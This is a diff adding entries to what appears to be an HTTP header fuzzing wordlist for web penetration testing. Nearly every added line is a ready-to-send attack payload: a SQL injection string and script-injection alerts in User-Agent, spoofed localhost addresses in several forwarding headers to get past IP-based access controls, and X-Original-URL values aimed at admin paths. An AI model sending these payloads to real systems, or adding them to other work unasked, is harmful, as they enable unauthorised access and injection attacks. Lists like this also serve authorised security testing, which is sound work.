@@ -1,4 +1,26 @@
-User-Agent: test
+User-Agent: ' OR 1=1 --
+User-Agent: <img src=x onerror=alert(`XSS check`)> 
+User-Agent: %3Cimg%20src%3Dx%20onerror%3Dalert%28%60XSS%20check%60%29%3E%20
+User-Agent: <script>alert(`XSS check`)</script>
+User-Agent: %3Cscript%3Ealert%28%60XSS%20check%60%29%3C%2Fscript%3E
 X-Forwarded-For: 127.0.0.1
 X-Forwarded-For: 127.1
 X-Forwarded-For: localhost
+X-Client-IP: localhost
+X-Client-IP: 127.0.0.1
+X-Client-IP: 127.1
+X-Original-URL: /admin
+X-Original-URL: /admininstrator
+X-Original-URL: /
+X-Original-URL: %2Fadmin 
+X-Original-URL: %2Fadmininstrator
+X-Original-URL: %2F
+X-Real-IP: 127.0.0.1
+X-Real-IP: 127.1
+X-Real-IP: localhost
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 127.1
+X-Forwarded-For: localhost 
+X-Forwarded-Host: 127.0.0.1 
+X-Forwarded-Host: 127.1
+X-Forwarded-Host: localhost
